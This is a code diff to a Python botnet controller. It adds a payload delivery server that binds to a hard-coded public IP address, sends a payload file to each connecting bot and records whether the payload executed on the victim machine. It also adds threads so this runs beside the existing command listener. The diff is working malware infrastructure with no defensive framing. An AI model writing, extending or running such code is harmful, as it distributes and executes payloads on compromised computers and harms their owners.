@@ -19,6 +19,35 @@ test_bool = False
 #            return True
 #    return False
 
+def start_payload_delivery_server(port=2004,ip="157.230.232.167"):
+    global payload_name
+    ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    ss.bind((ip,port))
+    ss.listen()
+    payload_file = open(payload_name,'rb')
+    payload = payload_file.read()
+    payload_file.close()
+    print("[*] Payload delivery server started loading %s"%(payload_name))
+    while True:
+        try:
+            client,addr = ss.accept()
+            print("[*] Sending payload to %s"%(str(addr[0])))
+            client.send(payload)
+            print("[*] Payload delivered to %s"%(str(addr[0])))
+            status = client.recv(1024).decode()
+            status = int(status)
+            if(status == 1):
+                print("[*] Payload executed on %s"%(str(addr[0])))
+            elif(status == 0):
+                print("[*] Payload failed to execute on %s"%(str(addr[0])))
+            else:
+                print("[*] An Unknown Error Occurred while executing payload on %s"%(str(addr[0])))
+        except socket.error:
+            print("[*] Error occured in handling the socket connection")
+        except Exception as ee:
+            print("[*] An Unknown Error Occurred : %s"%(str(ee)))
+
+
 def start_server(port=2003,ip="157.230.232.167"):
     global botnet,exec_command,on_connect_exit
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -244,15 +273,20 @@ def main():
     try:
         listener_thread = Thread(target=start_server,args=())
         listener_thread.start()
+        if(len(sys.argv) > 1):
+            payload_delivery_thread = Thread(target=start_payload_delivery_server,args=())
+            payload_delivery_thread.start()
         sleep(2)
         while True:
             cmd = raw_input("\n>>")
             command_thread = Thread(target=process_cmd,args=(cmd,))
+
             command_thread.start()
-            command_thread.join()
+
     except KeyboardInterrupt:
         print("[*] Botnet Terminated!")
         #listener_thread.kill()
+        sys.exit()
         quit()
     except Exception as ee:
         print("[*] Unknown Error Occured : %s"%(str(ee)))
